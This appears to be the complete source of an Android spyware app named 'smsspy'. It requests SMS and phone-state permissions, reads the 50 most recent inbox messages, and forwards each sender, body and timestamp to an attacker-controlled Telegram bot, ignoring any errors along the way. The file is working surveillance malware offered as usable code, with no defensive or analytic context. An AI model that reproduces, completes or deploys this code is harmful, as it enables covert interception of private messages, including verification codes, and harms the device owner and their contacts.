package com.smsspy.app;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import androidx.core.app.ActivityCompat;
import androidx.appcompat.app.AppCompatActivity;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_CODE = 123;
    private String botToken = "YOUR_BOT_TOKEN";
    private String adminChatId = "YOUR_CHAT_ID";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Request all critical permissions
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE
        };
        
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Start SMS monitoring immediately
                readAllSMS();
                sendToTelegram("📱 Device Activated - SMS Monitoring Started");
            }
        }
    }

    private void readAllSMS() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        String date = cursor.getString(cursor.getColumnIndex("date"));
                        
                        String message = "📨 From: " + address + "\n💬 " + body + "\n⏰ " + formatDate(date);
                        sendToTelegram(message);
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private String formatDate(String dateStr) {
        try {
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            return format.format(new Date(Long.parseLong(dateStr)));
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private void sendToTelegram(String message) {
        try {
            String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            String payload = "chat_id=" + adminChatId + "&text=" + 
                java.net.URLEncoder.encode(message, "UTF-8");
            
            OutputStream os = conn.getOutputStream();
            os.write(payload.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) {
            // Silent fail - continue operation
        }
    }
}
